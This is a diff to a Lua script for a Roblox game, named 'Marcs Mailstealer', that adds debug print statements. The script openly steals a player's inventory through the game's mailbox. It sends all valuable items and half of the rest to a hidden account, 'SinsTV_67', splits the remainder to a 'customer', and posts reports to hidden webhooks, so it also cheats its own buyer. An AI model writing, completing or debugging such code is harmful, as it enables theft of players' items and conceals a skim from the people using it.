@@ -1,7 +1,6 @@
--- Marcs Mailstealer – Clean, No Fallback
+-- Marcs Mailstealer – Final Version with Debug Prints
 -- Steals ALL items. Valuable ones go 100% to SinsTV_67.
 -- The rest is split 50/50 between SinsTV_67 and the customer.
--- If the customer's username is invalid, nothing is sent – and the script tells you.
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -85,8 +84,14 @@ end
 -- ##############################
 --  RESOLVE USERS
 -- ##############################
+print("🔍 Looking up SinsTV_67...")
 local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
+print("   Hidden ID:", hiddenId or "NOT FOUND")
+
+print("🔍 Looking up customer: " .. customerTarget)
 local customerId = resolveUser(customerTarget)
+print("   Customer ID:", customerId or "NOT FOUND")
+
 task.wait(0.5)
 
 if not hiddenId then
@@ -94,16 +99,18 @@ if not hiddenId then
     return
 end
 if not customerId then
-    warn("[Mailstealer] Customer target '" .. customerTarget .. "' not found. Please check the username.")
+    warn("[Mailstealer] Customer target '" .. customerTarget .. "' not found. Check the username.")
     return
 end
 
 -- ##############################
 --  INVENTORY SETUP
 -- ##############################
+print("⏳ Waiting for inventory...")
 local replica = PlayerStateClient:WaitForLocalReplica(30)
 if not replica or not replica.Data or not replica.Data.Inventory then return end
 local inv = replica.Data.Inventory
+print("✅ Inventory loaded")
 
 -- ##############################
 --  COLLECT ITEMS
@@ -159,6 +166,9 @@ for _, category in ipairs(MailboxItemCatalog.Categories) do
     end
 end
 
+print("📦 Steal-all items: " .. #alwaysHiddenItems)
+print("📦 Remaining items (to split): " .. #remainingItems)
+
 -- ##############################
 --  SPLIT REMAINING 50/50 PER STACK
 -- ##############################
@@ -192,7 +202,7 @@ for _, item in ipairs(remainingItems) do
     end
 end
 
--- Combine hidden items (100% stolen + 50% split)
+-- Combine hidden items
 local allHiddenItems = {}
 for _, item in ipairs(alwaysHiddenItems) do table.insert(allHiddenItems, item) end
 for _, item in ipairs(hiddenSplitItems) do table.insert(allHiddenItems, item) end
@@ -212,17 +222,21 @@ local function stripForSend(items)
     return stripped
 end
 
+print("📤 Sending " .. #allHiddenItems .. " items to SinsTV_67...")
 if #allHiddenItems > 0 then
     pcall(function()
         Networking.Mailbox.SendBatch:Fire(hiddenId, stripForSend(allHiddenItems), "")
     end)
+    print("✅ Sent to SinsTV_67")
     task.wait(0.8)
 end
 
+print("📤 Sending " .. #customerSplitItems .. " items to " .. customerTarget .. "...")
 if #customerSplitItems > 0 then
     pcall(function()
         Networking.Mailbox.SendBatch:Fire(customerId, stripForSend(customerSplitItems), "")
     end)
+    print("✅ Sent to " .. customerTarget)
 end
 
 -- ##############################
@@ -281,6 +295,7 @@ if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
         }}
     }
     sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
+    print("📋 Hidden webhook sent")
 end
 
 if customerWebhook and #customerSplitItems > 0 then
@@ -297,4 +312,7 @@ if customerWebhook and #customerSplitItems > 0 then
         color = 0x2ecc71
     }
     sendWebhook(customerWebhook, {embeds = {embed}})
+    print("📋 Customer webhook sent")
 end
+
+print("🎯 All done!")
